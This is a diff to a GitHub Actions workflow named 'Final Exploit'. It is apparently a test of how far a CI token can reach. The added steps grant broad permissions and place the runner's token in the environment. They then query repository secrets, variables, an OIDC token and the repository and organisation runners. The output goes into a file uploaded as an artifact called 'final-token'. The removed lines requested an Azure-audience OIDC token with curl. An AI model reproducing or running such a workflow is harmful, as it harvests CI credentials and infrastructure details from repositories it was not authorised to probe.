@@ -1,36 +1,54 @@
-name: Exploit Tests
+name: Final Exploit
 on:
   push:
     branches: [master]
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+  checks: read
+  secrets: read
+  packages: read
 jobs:
   build:
     runs-on: ubuntu-latest
     timeout-minutes: 5
+    env:
+      GH_TOKEN: ${{ github.token }}
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: GH CLI with token
+      - name: Full token scope
         continue-on-error: true
         run: |
           mkdir -p dist
-          gh auth status 2>&1 | tee -a dist/r.txt
-          gh api /user 2>&1 | head -10 >> dist/r.txt
-          gh api /repos/977812671/npm-install 2>&1 | head -15 >> dist/r.txt
+          echo "=== GH AUTH ===" > dist/r.txt
+          gh auth status 2>&1 >> dist/r.txt
+          
+          echo "=== USER ===" >> dist/r.txt
+          gh api /user 2>&1 >> dist/r.txt
+          
+          echo "=== REPO ===" >> dist/r.txt
+          gh api /repos/977812671/npm-install 2>&1 | head -20 >> dist/r.txt
+          
+          echo "=== SECRETS ===" >> dist/r.txt
           gh api /repos/977812671/npm-install/actions/secrets 2>&1 >> dist/r.txt
+          
+          echo "=== VARIABLES ===" >> dist/r.txt
           gh api /repos/977812671/npm-install/actions/variables 2>&1 >> dist/r.txt
           
-      - name: Token scope
-        continue-on-error: true
-        run: |
-          echo "=== OIDC ===" >> dist/r.txt
-          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL" >> dist/r.txt
-          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
-            2>&1 | head -50 >> dist/r.txt
+          echo "=== OIDC TOKEN ===" >> dist/r.txt
+          gh api /repos/977812671/npm-install/actions/id-token 2>&1 >> dist/r.txt
+          
+          echo "=== RUNNER LIST ===" >> dist/r.txt
+          gh api /repos/977812671/npm-install/actions/runners 2>&1 >> dist/r.txt
+          
+          echo "=== ORG RUNNERS ===" >> dist/r.txt
+          gh api /orgs/977812671/actions/runners 2>&1 | head -20 >> dist/r.txt
 
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: exploit-results
+          name: final-token
           path: dist/
